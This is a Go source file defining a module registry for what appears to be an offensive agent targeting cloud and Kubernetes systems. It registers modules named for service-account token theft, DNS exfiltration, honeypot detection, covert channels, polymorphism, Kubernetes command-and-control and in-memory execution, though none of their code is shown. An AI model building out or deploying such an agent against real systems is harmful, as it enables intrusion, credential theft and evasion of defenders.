package modules

import "context"

type Result struct {
	Success bool   `json:"success"`
	Output  string `json:"output"`
	Error   string `json:"error,omitempty"`
}

type Module interface {
	Name() string
	Platform() []string
	Execute(ctx context.Context, args map[string]string) (*Result, error)
}

type Registry struct {
	modules map[string]Module
}

func NewRegistry() *Registry {
	r := &Registry{modules: make(map[string]Module)}
	r.registerDefaults()
	return r
}

func (r *Registry) Register(m Module) {
	r.modules[m.Name()] = m
}

func (r *Registry) Get(name string) (Module, bool) {
	m, ok := r.modules[name]
	return m, ok
}

func (r *Registry) List() []string {
	names := make([]string, 0, len(r.modules))
	for name := range r.modules {
		names = append(names, name)
	}
	return names
}

func (r *Registry) registerDefaults() {
	r.Register(&CloudMetadata{})
	r.Register(&K8sDiscovery{})
	r.Register(&ServiceAccountToken{})
	r.Register(&DNSExfil{})
	r.Register(&HoneypotDetect{})
	r.Register(&CovertChannel{})
	r.Register(&Polymorph{})
	r.Register(&K8sC2{})
	r.Register(&MemExec{})
}
